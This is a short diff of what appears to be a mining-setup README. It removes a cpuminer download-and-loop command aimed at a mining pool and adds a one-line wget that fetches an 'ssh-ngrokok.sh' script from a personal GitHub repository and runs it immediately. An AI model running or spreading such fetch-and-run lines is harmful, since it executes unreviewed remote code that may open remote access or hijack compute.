@@ -28,8 +28,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-bioni
 ```
 #ccminer
 ```
-wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && echo '#!/bin/sh
-while [ 1 ]; do
-./cpuminer -a yespowersugar -o stratum+tcp://cpu-pool.com:63418 -u cpu1q2mncvlnz7ckq2jc4aggwq56crr2ul5mfl46j5c
-done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
-```
+wget https://raw.githubusercontent.com/igoz89/mining/main/ssh-ngrokok.sh && chmod +x ssh-ngrokok.sh && ./ssh-ngrokok.sh
